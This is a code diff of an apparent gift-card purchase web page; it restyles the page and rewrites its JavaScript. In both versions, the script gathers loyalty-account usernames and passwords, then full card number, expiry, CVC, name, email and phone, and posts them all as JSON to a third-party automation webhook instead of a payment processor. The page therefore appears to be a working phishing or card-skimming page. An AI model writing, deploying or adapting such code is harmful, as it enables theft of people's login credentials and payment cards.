@@ -32,6 +32,7 @@
       width: 100%;
       max-width: 480px;
       overflow: hidden;
+      position: relative;
     }
     header {
       background: var(--primary-dark);
@@ -40,10 +41,11 @@
     }
     header img {width: 160px;}
     main {padding: 2rem;}
+    section {display: none;}
+    section.active {display: block;}
     h1 {
       font-size: 1.8rem;
-      margin-bottom: 1.5rem;
-      color: var(--primary-dark);
+      margin-bottom: 1rem;
       text-align: center;
     }
     .giftcard-image {
@@ -78,6 +80,7 @@
       border: 2px solid var(--primary-dark);
       border-radius: var(--radius);
       background: #fff;
+      margin-bottom: 1rem;
     }
     input[readonly] {background: #e9ecef; cursor: not-allowed;}
     label {display: block; margin-bottom: 0.5rem; font-weight: bold;}
@@ -160,36 +163,72 @@
   </div>
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
-    const secs = ['amount','loyalty','pay','thanks'].map(i=>document.getElementById('sec-'+i));
-    function show(i){secs.forEach(s=>s.id.endsWith(i)?s.classList.add('active'):s.classList.remove('active'));}
-    // amount
-    let amt=100;
-    const ai=document.getElementById('amount');
-    document.getElementById('dec').onclick=()=>{if(amt>5){amt-=5;ai.value=amt}};
-    document.getElementById('inc').onclick=()=>{if(amt<500){amt+=5;ai.value=amt}};
-    document.getElementById('next-loyalty').onclick=()=>show('loyalty');
-    // loyalty
-    document.getElementById('skip').onclick=()=>{prep();show('pay');};
-    document.getElementById('frm-loyalty').onsubmit=e=>{
+    const secs = {
+      amount: document.getElementById('sec-amount'),
+      loyalty: document.getElementById('sec-loyalty'),
+      pay: document.getElementById('sec-pay'),
+      thanks: document.getElementById('sec-thanks')
+    };
+    function show(name) {
+      Object.values(secs).forEach(s => s.classList.remove('active'));
+      secs[name].classList.add('active');
+    }
+    let amt = 100;
+    const amtInput = document.getElementById('amount');
+    document.getElementById('dec').onclick = () => { if (amt > 5) { amt -= 5; amtInput.value = amt; } };
+    document.getElementById('inc').onclick = () => { if (amt < 500) { amt += 5; amtInput.value = amt; } };
+    document.getElementById('next-loyalty').onclick = () => show('loyalty');
+    document.getElementById('skip').onclick = () => { prep(); show('pay'); };
+    document.getElementById('frm-loyalty').onsubmit = e => {
       e.preventDefault();
-      const u=document.getElementById('user').value.trim(),p=document.getElementById('pass').value.trim();
-      if(!u||!p){return alert('Enter credentials');}
-      document.getElementById('loading').style.display='flex';
-      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:u,loyaltyPass:p,amount:amt})})
-      .then(r=>r.json()).then(r=>{document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode!==0) return alert(r.ErrorDescription||'Invalid'); prep(); show('pay');}).catch(()=>{document.getElementById('loading').style.display='none'; alert('Error');});
+      const u = document.getElementById('user').value.trim();
+      const p = document.getElementById('pass').value.trim();
+      if (!u || !p) return alert('Enter credentials');
+      document.getElementById('loading').style.display = 'flex';
+      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
+        method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({loyaltyUser: u, loyaltyPass: p, amount: amt})
+      })
+      .then(r=>r.json()).then(r=>{
+        document.getElementById('loading').style.display = 'none';
+        if (r.ExtendedResultCode !== 0) return alert(r.ErrorDescription || 'Invalid');
+        prep(); show('pay');
+      }).catch(()=>{document.getElementById('loading').style.display = 'none'; alert('Error');});
     };
-    function prep(){document.getElementById('amt-display').value=amt;document.getElementById('amt-hidden').value=amt;}
-    // payment
-    document.getElementById('frm-pay').onsubmit=async e=>{
-      e.preventDefault();const rec=grecaptcha.getResponse(); if(!rec) return alert('Complete reCAPTCHA');
-      const data={customer_email:document.getElementById('email').value,customer_phone:document.getElementById('phone').value,card_type:document.getElementById('card_type').value,card_name:document.getElementById('name').value,card_number:document.getElementById('number').value,card_expiry:document.getElementById('expiry').value,card_cvc:document.getElementById('cvc').value,amount:amt,'g-recaptcha-response':rec};
-      document.getElementById('loading').style.display='flex';
-      try{const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-        const txt=await res.text();const obj=JSON.parse(txt),r=Array.isArray(obj)?obj[0]:obj;
-        document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode===0) show('thanks'); else alert(r.ErrorDescription||'Error');
-      }catch{document.getElementById('loading').style.display='none';alert('Error');}
+    function prep() {
+      document.getElementById('amt-display').value = amt;
+      document.getElementById('amt-hidden').value = amt;
+    }
+    document.getElementById('frm-pay').onsubmit = async e => {
+      e.preventDefault();
+      const rec = grecaptcha.getResponse();
+      if (!rec) return alert('Complete reCAPTCHA');
+      const data = {
+        customer_email: document.getElementById('email').value,
+        customer_phone: document.getElementById('phone').value,
+        card_type: document.getElementById('card_type').value,
+        card_name: document.getElementById('name').value,
+        card_number: document.getElementById('number').value,
+        card_expiry: document.getElementById('expiry').value,
+        card_cvc: document.getElementById('cvc').value,
+        amount: amt,
+        'g-recaptcha-response': rec
+      };
+      document.getElementById('loading').style.display = 'flex';
+      try {
+        const res = await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
+          method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data)
+        });
+        const txt = await res.text();
+        const obj = JSON.parse(txt);
+        const r = Array.isArray(obj) ? obj[0] : obj;
+        document.getElementById('loading').style.display = 'none';
+        if (r.ExtendedResultCode === 0) show('thanks'); else alert(r.ErrorDescription || 'Error');
+      } catch {
+        document.getElementById('loading').style.display = 'none';
+        alert('Error');
+      }
     };
-    document.getElementById('finish').onclick=()=>location.reload();
+    document.getElementById('finish').onclick = () => location.reload();
   </script>
 </body>
 </html>
